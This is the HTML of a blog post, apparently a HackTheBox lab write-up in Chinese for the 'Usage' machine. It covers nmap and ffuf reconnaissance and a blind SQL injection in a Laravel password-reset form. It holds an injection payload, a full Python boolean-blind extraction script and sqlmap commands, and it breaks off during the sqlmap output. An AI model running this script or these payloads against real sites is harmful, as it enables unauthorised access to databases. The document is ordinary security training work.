@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Usage0x1 Nmap12345678910111222&#x2F;tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Usage">
+<meta property="og:url" content="https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Usage0x1 Nmap12345678910111222&#x2F;tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414185025-74gxhm0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414180942-phkjerd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414180904-06giy1y.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414181048-gdncc6x.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414181110-gw41zv5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212102-sntz6tg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414185752-sa4e714.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414205403-2grlnxa.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212230-6k5ztw6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212341-tws4ml2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414190600-dhnvtq9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212800-bh4ut3i.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212814-w98ih2u.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414213021-pr5f9pl.png">
+<meta property="article:published_time" content="2024-04-14T13:53:11.000Z">
+<meta property="article:modified_time" content="2024-08-11T05:31:26.052Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414185025-74gxhm0.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Usage</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/04/21/2024-htb-machine/15-Runner/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/04/07/2024-htb-machine/13-IClean/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&text=HackTheBox - Machine - Usage"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&is_video=false&description=HackTheBox - Machine - Usage"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Usage&body=Check out this article: https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&name=HackTheBox - Machine - Usage&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&t=HackTheBox - Machine - Usage"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Usage
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-14T13:53:11.000Z" class="dt-published" itemprop="datePublished">2024-04-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><h2 id="0x1-Nmap"><a href="#0x1-Nmap" class="headerlink" title="0x1 Nmap"></a>0x1 Nmap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     syn-ack ttl <span class="number">63</span> OpenSSH <span class="number">8.9</span>p1 Ubuntu 3ubuntu0<span class="number">.6</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">256</span> a0:f8:fd:d3:04:b8:07:a0:<span class="number">63</span>:dd:<span class="number">37</span>:df:d7:ee:ca:<span class="number">78</span> (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=</span><br><span class="line">|   <span class="number">256</span> bd:<span class="number">22</span>:f5:<span class="number">28</span>:<span class="number">77</span>:<span class="number">27</span>:fb:<span class="number">65</span>:ba:f6:fd:2f:<span class="number">10</span>:c7:<span class="number">82</span>:8f (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http    syn-ack ttl <span class="number">63</span> nginx <span class="number">1.18</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/<span class="number">1.18</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">|_http-title: Did <span class="keyword">not</span> follow redirect to http://usage.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>又是一個只有80端口的機器。</p>
+<h2 id="0x2-Web-Found-SQLI"><a href="#0x2-Web-Found-SQLI" class="headerlink" title="0x2 Web Found SQLI"></a>0x2 Web Found SQLI</h2><p>訪問80端口，跳轉到了 <code>usage.htb</code>​ ，隨手fuff一下子域名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://usage.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.usage.htb&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 178</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 232ms]</span><br><span class="line">    * FUZZ: admin</span><br></pre></td></tr></table></figure>
+
+<p>只是得到了 admin，順便探測一下服務器的環境，看看有什麽：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb http://usage.htb/                                                </span><br><span class="line">http://usage.htb/ [<span class="number">200</span> OK] Bootstrap[<span class="number">4.1</span><span class="number">.3</span>], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/<span class="number">1.18</span><span class="number">.0</span> (Ubuntu)], HttpOnly[laravel_session], IP[<span class="number">10.129</span><span class="number">.211</span><span class="number">.55</span>], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-<span class="built_in">type</span>-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[<span class="number">1</span>; mode=block], nginx[<span class="number">1.18</span><span class="number">.0</span>]</span><br></pre></td></tr></table></figure>
+
+<p>看起來是 <code>laravel</code>​的服務器，也就是php服務器，隨手輸入點東西發現這個頁面不是標准的404頁面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414185025-74gxhm0.png" alt="image">​</p>
+<p>來到了主頁面，嘗試登錄和sqli什麽也沒，但是有一個reset password的密碼有點奇怪：</p>
+<p>儅輸入一個 <code>&#39;</code>​ 會直接出現錯誤：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414180942-phkjerd.png" alt="image">​</p>
+<p>這個錯誤像是有 sqli的感覺，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414180904-06giy1y.png" alt="image">​</p>
+<p>然後用burp去抓一下包，這樣可以更方便的改payload：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414181048-gdncc6x.png" alt="image">​</p>
+<p>試了下 <code>&#39;or 1=1 -- </code>​ 果然有sqli，不過沒有回顯，也就只能使用盲注了。</p>
+<p>（當你使用 <code>&#39;</code>​ 搞壞了服務器，然後又想了辦法把他搞好之後，你就得到了 sqli 的payload）</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414181110-gw41zv5.png" alt="image">​</p>
+<h2 id="0x3-手工注入，還是使用-sqlmap-吧"><a href="#0x3-手工注入，還是使用-sqlmap-吧" class="headerlink" title="0x3 手工注入，還是使用 sqlmap 吧"></a>0x3 <del>手工注入，還是使用 sqlmap 吧</del></h2><p>可以參考<a target="_blank" rel="noopener" href="https://github.com/manesec/tools4mane/blob/main/Script/Mysql_Injection/bool_post_cli.py">之前寫好的模板</a>去進行手工注入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">OKMsg = [<span class="string">&quot;We have e-mailed your password reset link to&quot;</span>]</span><br><span class="line">FailedMsg = <span class="literal">None</span></span><br><span class="line">Req_url = <span class="string">&quot;http://10.129.74.11/administrative&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_http</span>(<span class="params">sql,index,guesschar</span>):</span><br><span class="line">    post_data = <span class="string">&quot;&#x27; or ascii(substr((%s),%s,1)) = %s  -- -&quot;</span> % (sql,index,guesschar)</span><br><span class="line"></span><br><span class="line">    burp0_url = <span class="string">&quot;http://usage.htb:80/forget-password&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;XSRF-TOKEN&quot;</span>: <span class="string">&quot;eyJpdiI6ImczVHZqeVpQYnhpODE0SEV3V1ZoWVE9PSIsInZhbHVlIjoibCtSU21KSTV0R0lTY3dGSWJKRjROZ0tPLzNmTFYxVUVQZmx0eks1TEcwc29RTXlmWXNhMWVkVjlhakF2dzJzTkJVMTd6UUc1bzlHRU1mS1l1dFpDTTEzOFEwWlZHSFhIRDkvcXpUM1ZzaVNHRjFvUmpOUUhvcGQzUjh3dDdrdVAiLCJtYWMiOiI3MWE1Y2M5NmZiNTE1ZmI4YmM0M2E5YTFiNWU5M2MxOWJkZTQzYWE5M2M1YWNhMmM4YWM1MzNjZjA4OWE2YjJlIiwidGFnIjoiIn0%3D&quot;</span>, <span class="string">&quot;laravel_session&quot;</span>: <span class="string">&quot;eyJpdiI6Ii9OY0tTWTBEbmN2Y0R1MXBwYXFCYWc9PSIsInZhbHVlIjoiSUdJL3EvQWVhRGM3dCtzYWhGOTNyTlhBbWpHNDl0cGRUT0g3OGpJZjdTek5mMDRhZWZYajBCSnBnblB4aHhtdmVOS1hKSVloZVl4RHFqbVFpZ2VPdWpBVVBpaTFVYTVyOVJVRDhKeFoxWlFKbjhXa2YrcS84N1pvYUhQcFhIUFkiLCJtYWMiOiI1NGEwYjc0YjY2YzgwNmNiNjMzNTZiYmIzMWJmNzJmMWEyYTc5OGMxZTlmZTIxY2U0OTAwNzU4MDBjMmRlNWViIiwidGFnIjoiIn0%3D&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://usage.htb&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://usage.htb/forget-password&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;_token&quot;</span>: <span class="string">&quot;qvFWdIi9mFtev8ejYNMyZe3E6kRHXo8gTdMGsZlv&quot;</span>, <span class="string">&quot;email&quot;</span>: post_data &#125;</span><br><span class="line">    return_txt = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FailedMsg):</span><br><span class="line">        <span class="keyword">for</span> fail <span class="keyword">in</span> FailedMsg:</span><br><span class="line">            <span class="keyword">if</span> (fail <span class="keyword">in</span> return_txt):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> okmsg <span class="keyword">in</span> OKMsg:</span><br><span class="line">        <span class="keyword">if</span> (okmsg <span class="keyword">in</span> return_txt):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_sql</span>(<span class="params">sql</span>):</span><br><span class="line">    guessed_str  = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        founded = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Guess str</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> request_http(sql,index,x) :</span><br><span class="line">                guessed_str +=<span class="built_in">chr</span>(x)</span><br><span class="line">                founded = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> (x == <span class="number">0</span>):</span><br><span class="line">                    founded = <span class="literal">False</span></span><br><span class="line">                <span class="built_in">print</span>(guessed_str)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> founded:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;---------------------- Return --------------------&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(guessed_str)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------------------------------------&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    query_sql(<span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>然後得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212102-sntz6tg.png" alt="image">​</p>
+<p>但是效率不如sqlmap，所以還是使用sqlmap吧。</p>
+<h2 id="0x3-SQLMAP-自動注入得到-hash"><a href="#0x3-SQLMAP-自動注入得到-hash" class="headerlink" title="0x3 SQLMAP 自動注入得到 hash"></a>0x3 SQLMAP 自動注入得到 hash</h2><p>用burp把上面的忘記密碼請求保存到文件，然後使用sqlmap自動去探測，由於知道是盲注所以就 <code>--technique=B</code>​ ，某些時候告訴sqlmap的參數越多，成功率就會越高：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -r forgot -p email --batch --level <span class="number">5</span> --risk <span class="number">3</span>  --technique=B</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [.]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent <span class="keyword">is</span> illegal. It <span class="keyword">is</span> the end use<span class="string">r&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 18:17:05 /2024-04-14/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[18:17:05] [INFO] parsing HTTP request from &#x27;</span>forgot<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:17:05] [INFO] testing connection to the target 